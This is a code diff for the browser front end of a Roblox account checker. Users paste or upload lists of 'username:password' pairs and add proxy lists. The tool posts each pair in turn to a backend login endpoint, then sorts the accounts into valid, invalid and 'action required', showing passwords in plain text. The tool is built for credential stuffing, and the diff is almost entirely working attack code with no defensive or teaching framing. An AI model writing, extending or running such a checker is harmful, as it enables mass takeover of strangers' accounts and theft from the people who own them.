@@ -1,12 +1,15 @@
-let app = document.getElementById('app');
+const app = document.getElementById('app');
 let userName = localStorage.getItem('username') || null;
+
 let format = { site: -1, username: -1, password: -1 };
 let parsedLines = [];
 let valid = [], invalid = [], actionRequired = [];
 let checkingCount = 0;
+
 let currentTab = 'accounts';
 let debugMode = false;
 let savedProxies = [];
+let debugLog = [];
 
 function switchTab(tab) {
   currentTab = tab;
@@ -15,38 +18,53 @@ function switchTab(tab) {
 
 function renderTab() {
   const tabContent = document.getElementById('tabContent');
+  if (!tabContent) return;
+
   switch (currentTab) {
     case 'accounts':
-      renderMainScreen(); // your existing main interface
+      renderMainScreen();
       break;
+
     case 'proxies':
       tabContent.innerHTML = `
         <h2>Proxy Settings</h2>
-        <textarea id="proxyInput" placeholder="Paste one proxy per line..."></textarea>
-        <button onclick="saveProxies()">Save Proxies</button>
+        <textarea id="proxyInput" placeholder="Paste one proxy per line..." style="width: 100%; height: 150px; font-family: monospace;"></textarea>
+        <button onclick="saveProxies()" style="margin-top: 10px; padding: 8px 16px; cursor: pointer;">Save Proxies</button>
         <h3>Saved Proxies:</h3>
-        <pre>${savedProxies.join('\n') || 'None'}</pre>
+        <pre style="background:#f5f5f5; padding: 10px; max-height: 200px; overflow-y:auto;">${savedProxies.length ? savedProxies.join('\n') : 'None'}</pre>
       `;
       break;
+
     case 'debug':
       tabContent.innerHTML = `
         <h2>Debug Mode</h2>
-        <label><input type="checkbox" onchange="toggleDebug(this)"> Enable Debug Output</label>
-        <div id="debugOutput" class="debug-log">${debugLog.join('\n')}</div>
+        <label style="display:flex; align-items:center; gap:8px;">
+          <input type="checkbox" onchange="toggleDebug(this)" ${debugMode ? 'checked' : ''} />
+          Enable Debug Output
+        </label>
+        <pre id="debugOutput" style="background:#111; color:#0f0; padding: 10px; height: 200px; overflow-y: auto; margin-top: 10px; font-family: monospace;">${debugLog.join('\n')}</pre>
       `;
       break;
+
+    default:
+      tabContent.textContent = 'Unknown tab.';
   }
 }
 
 function toggleDebug(checkbox) {
   debugMode = checkbox.checked;
+  if (!debugMode) {
+    debugLog = [];
+    const debugOutput = document.getElementById('debugOutput');
+    if (debugOutput) debugOutput.textContent = '';
+  }
 }
 
 function saveProxies() {
   const input = document.getElementById('proxyInput').value.trim();
-  savedProxies = input.split('\n').filter(line => line.trim());
+  savedProxies = input.split('\n').map(line => line.trim()).filter(line => line.length > 0);
   alert('Proxies saved!');
-  renderTab(); // Refresh proxy list
+  renderTab();
 }
 
 function logout() {
@@ -54,55 +72,68 @@ function logout() {
   location.reload();
 }
 
-let debugLog = [];
-
 function logDebug(message) {
   if (debugMode) {
     debugLog.push(message);
-    const el = document.getElementById('debugOutput');
-    if (el) el.textContent = debugLog.join('\n');
+    const debugOutput = document.getElementById('debugOutput');
+    if (debugOutput) {
+      debugOutput.textContent = debugLog.join('\n');
+      debugOutput.scrollTop = debugOutput.scrollHeight;
+    }
   }
 }
 
 function renderNameScreen() {
   app.innerHTML = `
-    <div class="name-screen" style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh;">
+    <div class="name-screen" style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; font-family: Arial, sans-serif;">
       <h1>Enter your name...</h1>
-      <input id="nameInput" placeholder="Enter your name..." autocomplete="off" style="padding:10px; font-size:1rem; margin-bottom:10px;">
-      <button onclick="saveName()" style="padding:8px 16px; cursor:pointer;">Continue</button>
+      <input id="nameInput" placeholder="Enter your name..." autocomplete="off" style="padding:10px; font-size:1rem; margin-bottom:10px; width: 250px;"/>
+      <button id="continueBtn" style="padding:8px 16px; cursor:pointer;">Continue</button>
     </div>
   `;
-  document.getElementById('nameInput').addEventListener('keydown', e => {
-    if(e.key === 'Enter') saveName();
+  const input = document.getElementById('nameInput');
+  const btn = document.getElementById('continueBtn');
+
+  btn.onclick = saveName;
+  input.addEventListener('keydown', e => {
+    if (e.key === 'Enter') saveName();
   });
 }
 
 function saveName() {
   const name = document.getElementById('nameInput').value.trim();
-  if (name) {
-    localStorage.setItem('username', name);
-    userName = name;
-    renderMainScreen();
+  if (!name) {
+    alert('Please enter a valid name.');
+    return;
   }
+  localStorage.setItem('username', name);
+  userName = name;
+  renderMainScreen();
 }
 
 function renderMainScreen() {
   app.innerHTML = `
-    <div class="main-screen" style="max-width: 800px; margin: 2rem auto; display:flex; flex-direction: column; align-items: center; font-family: Arial, sans-serif;">
+    <div class="main-screen" style="max-width: 800px; margin: 2rem auto; font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center;">
       <h1>Hello, <span class="green">${userName}</span></h1>
-      <textarea id="credInput" rows="8" cols="50" placeholder="Paste your credentials here..." style="width: 100%; max-width: 600px; margin-bottom: 1rem; padding: 10px; font-family: monospace;"></textarea>
-      <input type="file" id="fileInput" style="margin-bottom: 1rem;">
-      <button onclick="previewData()" style="padding: 8px 16px; cursor: pointer; margin-bottom: 1rem;">Preview & Assign Format</button>
+      <textarea id="credInput" rows="8" placeholder="Paste your credentials here..." style="width: 100%; max-width: 600px; font-family: monospace; padding: 10px; margin-bottom: 1rem;"></textarea>
+      <input type="file" id="fileInput" style="margin-bottom: 1rem;"/>
+      <button id="previewBtn" style="padding: 8px 16px; cursor: pointer; margin-bottom: 1rem;">Preview & Assign Format</button>
+
       <div id="previewArea" style="width: 100%; max-width: 600px; text-align: left;"></div>
+
       <div id="siteSelect" class="hidden" style="width: 100%; max-width: 600px; margin-top: 1rem; text-align: center;">
-        <h2>Site: <img src="https://www.roblox.com/favicon.ico" style="width:20px; vertical-align: middle;"> Roblox</h2>
-        <button onclick="validateCredentials()" style="padding: 8px 16px; cursor: pointer;">Validate Credentials</button>
+        <h2>Site: <img src="https://www.roblox.com/favicon.ico" alt="Roblox" style="width:20px; vertical-align: middle;"> Roblox</h2>
+        <button id="validateBtn" style="padding: 8px 16px; cursor: pointer;">Validate Credentials</button>
         <div id="progress" style="margin-top: 10px;"></div>
       </div>
+
       <div id="results" style="width: 100%; max-width: 600px; margin-top: 2rem;"></div>
     </div>
   `;
-  document.getElementById('fileInput').addEventListener('change', () => previewData());
+
+  document.getElementById('fileInput').addEventListener('change', previewData);
+  document.getElementById('previewBtn').onclick = previewData;
+  document.getElementById('validateBtn').onclick = validateCredentials;
 }
 
 function previewData() {
@@ -122,22 +153,23 @@ function previewData() {
 }
 
 function processPreview(data) {
-  parsedLines = data.split('\n').filter(line => line.includes(':') || line.includes(',') || line.includes('|'));
-  if (parsedLines.length === 0) return alert('No valid lines found.');
+  parsedLines = data.split('\n').filter(line => line.includes(':') || line.includes(',') || line.includes('|')).map(line => line.trim());
+  if (parsedLines.length === 0) {
+    alert('No valid lines found.');
+    return;
+  }
 
-  const delimiter = parsedLines[0].includes(':') ? ':' :
-                    parsedLines[0].includes(',') ? ',' : '|';
+  const delimiter = parsedLines[0].includes(':') ? ':' : parsedLines[0].includes(',') ? ',' : '|';
 
-  const firstFew = parsedLines.slice(0, 3);
-  let previewHTML = `<h2>Assign Format:</h2>`;
+  const previewLines = parsedLines.slice(0, 3);
+  let previewHTML = `<h2>Assign Format:</h2><div style="display:flex; gap:10px;">`;
 
-  const firstTokens = firstFew[0].split(delimiter);
+  const tokens = previewLines[0].split(delimiter);
 
-  previewHTML += `<div class="preview-line" style="display:flex; gap:10px;">`;
-  firstTokens.forEach((token, idx) => {
+  tokens.forEach((token, idx) => {
     previewHTML += `
-      <div style="flex: 1;">
-        <div class="token" style="background: #f0f0f0; padding: 6px; border-radius: 4px; font-family: monospace;">${token}</div>
+      <div style="flex:1;">
+        <div style="background:#f0f0f0; padding: 6px; border-radius: 4px; font-family: monospace;">${token}</div>
         <select onchange="setFormat(${idx}, this.value)" style="width: 100%; margin-top: 4px; padding: 4px;">
           <option value="">None</option>
           <option value="username">Username</option>
@@ -148,32 +180,36 @@ function processPreview(data) {
     `;
   });
   previewHTML += `</div>`;
-  previewHTML += `<pre style="margin-top:1rem; font-family: monospace;">${firstFew.join('\n')}</pre>`;
+
+  previewHTML += `<pre style="margin-top:1rem; font-family: monospace;">${previewLines.join('\n')}</pre>`;
 
   document.getElementById('previewArea').innerHTML = previewHTML;
   document.getElementById('siteSelect').classList.remove('hidden');
 }
 
 function setFormat(index, role) {
-  for (let key in format) {
+  // Ensure no duplicate assignments
+  for (const key in format) {
     if (format[key] === index) format[key] = -1;
   }
-  if (role) {
-    format[role] = index;
-  }
+  if (role) format[role] = index;
 }
 
 async function validateCredentials() {
   if (format.username === -1 || format.password === -1) {
-    return alert('Please assign Username and Password fields.');
+    alert('Please assign Username and Password fields.');
+    return;
   }
 
   valid = [];
   invalid = [];
   actionRequired = [];
   checkingCount = 0;
-  document.getElementById('results').innerHTML = '';
-  document.getElementById('progress').innerText = `Checked: 0 / ${parsedLines.length}`;
+
+  const resultsDiv = document.getElementById('results');
+  const progressDiv = document.getElementById('progress');
+  resultsDiv.innerHTML = '';
+  progressDiv.innerText = `Checked: 0 / ${parsedLines.length}`;
 
   for (const line of parsedLines) {
     const delimiter = line.includes(':') ? ':' : line.includes(',') ? ',' : '|';
@@ -183,9 +219,12 @@ async function validateCredentials() {
 
     if (!username || !password) continue;
 
-    const result = await checkRobloxCredentials(username, password);
+    logDebug(`Checking ${username}...`);
+
+    const result = await checkRobloxCredentialsAPI(username, password);
+
     checkingCount++;
-    document.getElementById('progress').innerText = `Checked: ${checkingCount} / ${parsedLines.length}`;
+    progressDiv.innerText = `Checked: ${checkingCount} / ${parsedLines.length}`;
 
     if (result.success) {
       valid.push(result);
@@ -198,48 +237,20 @@ async function validateCredentials() {
   }
 }
 
-async function checkRobloxCredentials() {
-  const username = document.getElementById('username').value.trim();
-  const password = document.getElementById('password').value.trim();
-  const results = document.getElementById('results');
-  const previewArea = document.getElementById('previewArea');
-  const debugLog = document.getElementById('debugLog');
-
-  results.innerHTML = '';
-  previewArea.classList.remove('hidden');
-  debugLog.textContent = '';
-
-  if (!username || !password) {
-    results.innerHTML = `<p class="profile-link red">Please enter both username and password.</p>`;
-    return;
-  }
-
+async function checkRobloxCredentialsAPI(username, password) {
   try {
     const response = await fetch('/api/roblox-login', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username, password })
+      body: JSON.stringify({ username, password }),
     });
-
     const data = await response.json();
-    if (data.success) {
-      results.innerHTML = `
-        <div class="result-card">
-          <img src="https://www.roblox.com/headshot-thumbnail/image?userId=${data.userId}&width=150&height=150&format=png" alt="Avatar" />
-          <div>
-            <a class="profile-link green" href="https://www.roblox.com/users/${data.userId}/profile" target="_blank">
-              ${data.username}
-            </a>
-            <p class="password">Password: ${password}</p>
-          </div>
-        </div>
-      `;
-    } else {
-      results.innerHTML = `<p class="profile-link red">Invalid credentials.</p>`;
-    }
+    data.username = username;
+    data.password = password;
+    return data;
   } catch (err) {
-    debugLog.textContent = `Error: ${err.message}`;
-    results.innerHTML = `<p class="profile-link red">Server error. See debug log.</p>`;
+    logDebug(`Error checking ${username}: ${err.message}`);
+    return { success: false, error: err.message };
   }
 }
 
@@ -247,58 +258,39 @@ function renderResults(validArr, invalidArr, actionArr) {
   let html = '';
 
   html += `<h2 style="color:green;">✅ Valid Accounts</h2>`;
-  if (validArr.length === 0) html += `<p>No valid accounts yet.</p>`;
-  validArr.forEach(user => {
-    html += resultCard(user, 'green');
-  });
+  html += validArr.length === 0 ? `<p>No valid accounts yet.</p>` : validArr.map(user => resultCard(user, 'green')).join('');
 
   html += `<h2 style="color:orange;">⚠️ Action Required Accounts</h2>`;
-  if (actionArr.length === 0) html += `<p>No accounts require action.</p>`;
-  actionArr.forEach(user => {
-    html += resultCard(user, 'orange', user.reason);
-  });
+  html += actionArr.length === 0 ? `<p>No accounts requiring action yet.</p>` : actionArr.map(user => resultCard(user, 'orange')).join('');
 
   html += `<h2 style="color:red;">❌ Invalid Accounts</h2>`;
-  if (invalidArr.length === 0) html += `<p>No invalid accounts yet.</p>`;
-  invalidArr.forEach(user => {
-    html += resultCard(user, 'red');
-  });
+  html += invalidArr.length === 0 ? `<p>No invalid accounts yet.</p>` : invalidArr.map(user => resultCard(user, 'red')).join('');
 
   document.getElementById('results').innerHTML = html;
 }
 
-function resultCard(user, color, reason = '') {
-  // Fix profile image url: Roblox userId must be number > 0, fallback if none.
-  let userId = user.userId && !isNaN(user.userId) ? user.userId : 0;
-  let avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=50&height=50&format=png`;
-
+function resultCard(user, color) {
   return `
-    <div class="result-card" style="border: 2px solid ${color}; padding: 10px; margin: 10px 0; display:flex; align-items:center; gap: 15px; border-radius: 8px;">
-      <img src="${avatarUrl}" alt="Avatar" style="border-radius: 50%; width: 50px; height: 50px;" onerror="this.onerror=null;this.src='https://www.roblox.com/favicon.ico'">
-      <div style="flex-grow: 1;">
-        <a href="https://www.roblox.com/users/${userId}/profile" target="_blank" style="color:${color}; font-weight: bold; font-family: monospace; text-decoration:none;">
-          ${user.username}
-        </a><br>
-        <span class="password" 
-          style="font-family: monospace; user-select: all; cursor: pointer; color: #444;"
-          title="Click to toggle visibility"
-          onclick="togglePasswordVisibility(this)"
-          data-password="${user.password}"
-        >••••••••</span>
-        ${reason ? `<div style="color:${color}; font-size:0.85rem; margin-top:4px;">${reason}</div>` : ''}
-      </div>
+    <div style="border: 1px solid ${color}; padding: 10px; margin-bottom: 10px; border-radius: 6px; font-family: monospace;">
+      <strong>${user.username}</strong> : ${user.password}
+      ${user.reason ? `<div style="color: ${color}; font-style: italic;">${user.reason}</div>` : ''}
     </div>
   `;
 }
 
-function togglePasswordVisibility(el) {
-  if (el.innerText === '••••••••') {
-    el.innerText = el.dataset.password;
-    el.style.color = '#000';
+function init() {
+  if (!userName) {
+    renderNameScreen();
   } else {
-    el.innerText = '••••••••';
-    el.style.color = '#444';
+    renderMainScreen();
   }
+  renderTab();
 }
 
-userName ? renderMainScreen() : renderNameScreen();
+window.switchTab = switchTab;
+window.setFormat = setFormat;
+window.toggleDebug = toggleDebug;
+window.saveProxies = saveProxies;
+window.logout = logout;
+
+init();
